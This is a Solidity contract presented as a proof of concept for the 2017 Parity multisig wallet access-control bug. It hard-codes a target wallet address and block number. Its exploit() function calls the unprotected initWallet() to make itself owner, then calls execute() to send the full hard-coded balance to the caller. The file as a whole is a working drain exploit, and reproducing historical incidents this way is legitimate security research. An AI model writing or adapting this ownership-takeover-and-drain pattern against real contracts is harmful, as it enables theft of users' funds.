// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice PoC for the Parity Wallet access-control bug (July 2017).
/// @dev Anyone could call initWallet() on an uninitialized wallet proxy.
///      This PoC takes ownership and drains the full balance.
///      Target wallet: 0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e
///      Target block: 4,043,799 (pre-drain)
contract Exploit {
    address constant WALLET = 0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e;

    // Wallet balance at block 4,043,799
    uint256 constant DRAIN_AMOUNT = 82189932605820062911880;

    function exploit() external {
        // Step 1: Take ownership (initWallet is unprotected)
        // The wallet sees msg.sender as this PoC contract, so set owner to address(this).
        address receiver = msg.sender;
        address[] memory owners = new address[](1);
        owners[0] = address(this);
        bytes memory initData = abi.encodeWithSignature(
            "initWallet(address[],uint256,uint256)",
            owners,
            1,
            DRAIN_AMOUNT
        );
        (bool initOk, ) = WALLET.call(initData);
        require(initOk, "initWallet failed");

        // Step 2: Drain the full balance to the external caller
        bytes memory execData = abi.encodeWithSignature(
            "execute(address,uint256,bytes)",
            receiver,
            DRAIN_AMOUNT,
            ""
        );
        (bool execOk, ) = WALLET.call(execData);
        require(execOk, "execute failed");
    }
}
